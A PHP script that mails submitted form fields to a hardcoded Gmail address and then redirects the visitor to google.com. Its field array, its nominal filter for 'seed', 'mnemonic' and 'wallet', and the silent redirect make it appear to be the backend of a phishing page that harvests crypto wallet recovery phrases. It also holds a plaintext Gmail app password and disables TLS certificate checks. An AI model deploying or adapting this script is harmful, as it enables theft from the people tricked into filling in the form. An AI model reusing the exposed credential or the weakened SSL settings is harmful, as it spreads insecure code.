<?php

// Load PHPMailer (adjust path to your install)
require 'smtp/PHPMailerAutoload.php'; // or use Composer autoload if available

// helper: check for suspicious content (very simple heuristic)
function contains_sensitive_terms($values) {
    $bad = ['seed','mnemonic','private','secret','password','key','wallet','phrase'];
    foreach ($values as $v) {
        if (!is_string($v)) continue;
        $lower = strtolower($v);
        foreach ($bad as $term) {
            if (strpos($lower, $term) !== false) return true;
        }
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo 'Invalid request method.';
    exit;
}

// Expecting inputs named fields[] in the form (non-sensitive demo)
$fields = isset($_POST['fields']) && is_array($_POST['fields']) ? $_POST['fields'] : [];

// Trim and remove empty entries
$clean = array_values(array_filter(array_map('trim', $fields), function($v){ return $v !== ''; }));

if (empty($clean)) {
    echo 'No data submitted.';
    exit;
}

// Safety check: refuse if suspicious keywords appear
if (contains_sensitive_terms($clean)) {
    http_response_code(400);
    echo 'Submission rejected: sensitive data detected.';
    exit;
}

// Build email body (safe HTML)
$body = "<h2 style='font-family:Arial,sans-serif;color:#111;'>Fields Submission</h2>";
$body .= "<ol style='font-family:Arial,sans-serif;color:#333;'>";
foreach ($clean as $i => $v) {
    $body .= "<li>" . htmlspecialchars($v, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8') . "</li>";
}
$body .= "</ol>";

try {
    $mail = new PHPMailer();
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = 'tls';
    $mail->Host = 'smtp.gmail.com';
    $mail->Port = 587;

    // TODO: set your credentials here (use app password for Gmail)
     $mail->Username = "jhnkenrick@gmail.com";
    $mail->Password = "iclvtpqxcjdprtfh";
    $mail->setFrom('jhnkenrick@gmail.com', ' Sender');
    $mail->addAddress('jhnkenrick@gmail.com', ' Recipient');

    $mail->isHTML(true);
    $mail->Subject = 'Fields Submission';
    $mail->Body = $body;

    // Optional: relax SSL checks if needed (not recommended for production)
    $mail->SMTPOptions = [
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ];

    if (!$mail->send()) {
        http_response_code(500);
        echo 'Mailer Error: ' . htmlspecialchars($mail->ErrorInfo);
    } else {
        header("Location: https://www.google.com/");
        exit();
    }

} catch (Exception $e) {
    http_response_code(500);
    echo 'Exception: ' . htmlspecialchars($e->getMessage());
}
?>